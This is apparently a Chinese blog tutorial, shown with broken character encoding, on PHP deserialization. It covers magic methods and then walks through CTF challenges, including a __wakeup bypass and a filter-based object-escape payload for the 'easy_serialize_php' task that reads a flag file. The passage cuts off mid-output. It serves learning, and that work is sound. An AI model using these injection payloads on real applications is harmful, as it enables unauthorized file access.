//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚</p></blockquote><p>å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p></blockquote><p>é¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p><p>ä¸¾ä¸ª ä¾‹å­åŠ æ·±ç†è§£</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Caiji</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ID</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span> <span class="token operator">=</span> <span class="token variable">$ID</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * serializeå‰è°ƒç”¨ ç”¨äºåˆ é€‰éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å˜é‡     * @return array [description]     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'ID'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * unserializeå‰è°ƒç”¨ ç”¨äºé¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æº     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Caiji</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'twosmi1e'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$me</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å­˜åœ¨__sleep(å‡½æ•°ï¼Œ$infoå±æ€§ä¸ä¼šè¢«å­˜å‚¨</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$me</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$temp</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//__wakeup()ç»„è£…çš„$info</span><span class="token variable">$me</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201751912.png" alt="image-20210208201751912"></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ID</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span> <span class="token operator">=</span> <span class="token variable">$ID</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'smi1e'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'__toString:'</span> <span class="token operator">.</span> <span class="token variable">$me</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201815930.png" alt="image-20210208201815930"></p><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><h4 id="ä»¥å‰åšè¿‡çš„ä¸€ä¸ªé¢˜"><a href="#ä»¥å‰åšè¿‡çš„ä¸€ä¸ªé¢˜" class="headerlink" title="ä»¥å‰åšè¿‡çš„ä¸€ä¸ªé¢˜"></a>ä»¥å‰åšè¿‡çš„ä¸€ä¸ªé¢˜</h4><p>ä¸»è¦ä»£ç ä¸º</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®é¢˜ç›®è¦æ±‚åºåˆ—åŒ–ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åºåˆ—åŒ–ä¹‹åå¹¶ä¸æ˜¯æœ€ç»ˆçš„payloadï¼Œè¿™é‡Œååºåˆ—çš„æ—¶å€™å…ˆè°ƒç”¨_wakeup()å‡½æ•°ï¼Œä¼šæŠŠusernameåˆå§‹åŒ–ä¸ºguestï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡å®ƒã€‚</p><p>è€Œç»•è¿‡_wakeup()å‡½æ•°åªéœ€è¦è®©å¯¹è±¡çš„å±æ€§æ•°æ¯”å®ƒå®é™…çš„å¤§å°±è¡Œ</p><h4 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><p>æ ¹æ®ä»£ç æç¤ºï¼Œåœ¨phpinfoé‡Œé¢æ‰¾åˆ°ä¸€ä¸ªè¿™ä¸ª</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201837952.png" alt="image-20210208201837952"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å°†æ•°ç»„å±•å¼€ï¼Œé”®åä½œä¸ºå˜é‡åï¼Œå…ƒç´ å€¼ä¸ºå˜é‡å€¼</span><span class="token comment">//int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</span><span class="token comment">//æœ¬å‡½æ•°ç”¨æ¥å°†å˜é‡ä»æ•°ç»„ä¸­å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚æ¥å—ç»“åˆæ•°ç»„ var_array ä½œä¸ºå‚æ•°å¹¶å°†é”®åå½“ä½œå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å¯¹æ¯ä¸ªé”®å€¼å¯¹éƒ½ä¼šåœ¨å½“å‰çš„ç¬¦å·è¡¨ä¸­å»ºç«‹å˜é‡ï¼Œå¹¶å—åˆ° extract_type å’Œ prefix å‚æ•°çš„å½±å“ã€‚</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œä¼šè¿‡æ»¤æ‰ä¸€äº›å…³é”®è¯ï¼Œå¾ˆæ˜¾ç„¶è¿™æ˜¯ä¸€ç§å¯¹è±¡é€ƒé€¸çš„é¢˜</p><p>è¿‡æ»¤å‡½æ•°ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š<br><strong>ç¬¬ä¸€ç§ä¸ºå…³é”®è¯æ•°å¢åŠ </strong></p><p>ä¾‹å¦‚ï¼š where-&gt;hahahaï¼Œè¿™æ ·è¯æ•°ç”±äº”ä¸ªå¢åŠ åˆ°6ä¸ª</p><p><strong>ç¬¬äºŒç§ä¸ºå…³é”®è¯æ•°å‡å°‘</strong></p><p>æ¯”å¦‚ä¼šç›´æ¥è¿‡æ»¤æ‰ä¸€äº›å…³é”®è¯ï¼Œè¿™é“é¢˜ä¸€æ ·</p><p>è¿‡æ»¤å‡½æ•°filter()å¯¹serialize($_SESSION)è¿›è¡Œè¿‡æ»¤ï¼Œæ»¤æ‰ä¸€äº›å…³é”®å­—<br>é‚£ä¹ˆæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š<br><strong>é”®é€ƒé€¸å’Œå€¼é€ƒé€¸</strong></p><p>å€¼é€ƒé€¸ï¼š<br>éœ€è¦ä¸¤ä¸ªè¿ç»­çš„é”®å€¼å¯¹ï¼Œç”±ç¬¬ä¸€ä¸ªçš„å€¼è¦†ç›–ç¬¬äºŒä¸ªçš„é”®ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå€¼å°±é€ƒé€¸å‡ºå»ï¼Œå•ç‹¬ä½œä¸ºä¸€ä¸ªé”®å€¼å¯¹</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&amp;function=show_image<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>var_dumpçš„ç»“æœä¸ºï¼š</p><pre class="line-numbers language-none"><code 